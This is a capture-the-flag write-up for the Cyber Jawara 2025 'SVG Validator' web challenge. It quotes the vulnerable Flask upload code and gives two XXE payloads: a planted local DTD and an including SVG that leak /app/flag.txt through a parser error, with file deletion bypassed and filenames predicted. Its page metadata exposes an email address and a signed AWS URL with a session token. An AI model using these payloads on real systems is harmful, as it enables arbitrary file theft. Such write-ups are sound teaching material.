---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466ZKJ6UGN6%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T210326Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCzgcP35rwbl7b1IA%2FEpxX6W8%2FvDrywJXaWJ94ArmUrGQIhAJUVwkdduiaDeBH3TFD0C4atCJgig8ZjvF50K3LpbrVQKogECPb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxJ6FSscWm1SyC%2BRuMq3AOB%2BzdyHjBdIRwgR04y8tVUlZBqXpVyUI7IexTejsdH8QrwYvnfPon4IYPyX026lHyrl7aWTFK1VielSfiisb0%2BkiQnXIaAZw19wgdI0BrhePQtksKbDVjB%2FyJHJXbqLM4GQ1egKq6uHDXKLSN5rRm4g%2F2fZZ4HDELd2jisHcxhikSNKE9R4ZMDJaSH4GLu6mlCEfQfb9fSVwjJ3uwfxfDEC2EW7iOBdFU2Ut6IHXt2r%2Brb2VzAKs1QMQJcc0lDSCgu5%2FrjicDS%2BvjWamrlZfE80iX2sEOQ07QE4AmA0N7WUdsv95mSUVBZ3BVBPuQ18QiyITE1tZxsoUFghy9HASMpgZSvkRjk5RJ0%2FXu9vm24IT%2BoQwAueYKHDxIWb23yBMfL99qhOFuJLR7n%2Bn9lrY4zqGVKjdF2HV5tzMQYcT604VgxQD2PESKko2QN1nc5qV3a33Jty%2FFJDY8CIrZZC7P6qpTPlJsmAKJEDrKE1Gcg%2FfQ9CM%2BeU9A4Ens1LnHcpOHDHY5XsFBedg1rUY1p4nixlhXQJhDzKAqyKlzl%2FlVEODW8J0niUbCL1CY1%2Fr7KQ7JPL9kliMmpSp%2F3PuvniAc%2Bd5asLKKNabW61w8s8jeI7jX%2FjrlOuOM%2Bz98HNTDsvcPBBjqkAXinrpEnZisQIzIG8i61KGyH0lZEqYMlZtx2TQL3jNQgRUSYsyKsWhOKXK6ap07bgupU3XXNEiI6nF2cflu%2F%2FyID6qYIMBqXhnCq16xjAKH8V5mjh9B10AwD30YHytyOwi7fx9CQCAF7P9cjPdNK%2BBiKjjrUidwOQ%2FoZ8J%2FbXP0KlRP6v%2FK2duEpFdq%2B3iVXCKDwnUTBMDCljHkgqWWOmkb0Of9I\&X-Amz-Signature=148f3090ed377626955cb1f1fc06fe5239443c098c61b2b512272c635f0bbc5d\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
